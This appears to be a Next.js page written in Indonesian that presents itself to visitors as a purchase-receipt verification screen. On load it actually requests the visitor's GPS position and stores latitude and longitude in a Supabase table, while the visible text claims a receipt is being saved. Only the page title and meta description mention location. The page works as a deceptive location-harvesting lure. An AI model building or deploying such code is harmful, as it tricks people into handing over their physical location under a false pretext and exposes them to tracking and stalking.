import Head from "next/head";
import { useEffect, useState } from "react";
import { Geist, Geist_Mono } from "next/font/google";
import styles from "@/styles/Home.module.css";
import { createClient } from "@supabase/supabase-js";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
);

export default function Home() {
  const [locationSaved, setLocationSaved] = useState(false);

  useEffect(() => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const latitude = pos.coords.latitude;
          const longitude = pos.coords.longitude;

          // Simpan ke Supabase
          const { error } = await supabase.from("photos").insert([
            {
              latitude,
              longitude,
            },
          ]);

          if (error) {
            console.error("Gagal simpan lokasi:", error.message);
          } else {
            setLocationSaved(true);
            console.log("Lokasi berhasil disimpan.");
          }
        },
        (err) => {
          console.error("Gagal ambil lokasi:", err.message);
        }
      );
    }
  }, []);

  return (
    <>
      <Head>
        <title>Verifikasi Lokasi</title>
        <meta name="description" content="Simpan lokasi GPS ke Supabase" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>

      <div className={`${styles.page} ${geistSans.variable} ${geistMono.variable}`}>
        <main className={styles.main}>
          <h1>Verifikasi Struk Pembelian</h1>
          {locationSaved ? (
            <p>Struk berhasil disimpan ke database ✅</p>
          ) : (
            <p>Mengambil dan menyimpan Struk...</p>
          )}
        </main>
      </div>
    </>
  );
}
